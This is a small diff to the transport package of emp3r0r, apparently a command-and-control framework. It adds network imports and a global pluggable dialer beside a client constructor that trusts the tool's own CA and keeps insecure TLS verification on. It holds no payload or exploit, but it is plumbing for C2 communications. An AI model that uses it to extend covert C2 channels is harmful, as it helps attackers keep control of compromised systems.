@@ -1,6 +1,8 @@
 package transport
 
 import (
+	"context"
+	"net"
 	"net/http"
 	"net/url"
 	"strings"
@@ -10,6 +12,8 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	utls "github.com/refraction-networking/utls"
 )
+
+var GlobalMeshDialer func(ctx context.Context, network, addr string) (net.Conn, error)
 
 // CreateEmp3r0rHTTPClient add our CA to trusted CAs, while keeps TLS InsecureVerify on
 // c2_addr: C2 address, only the hostname will be used
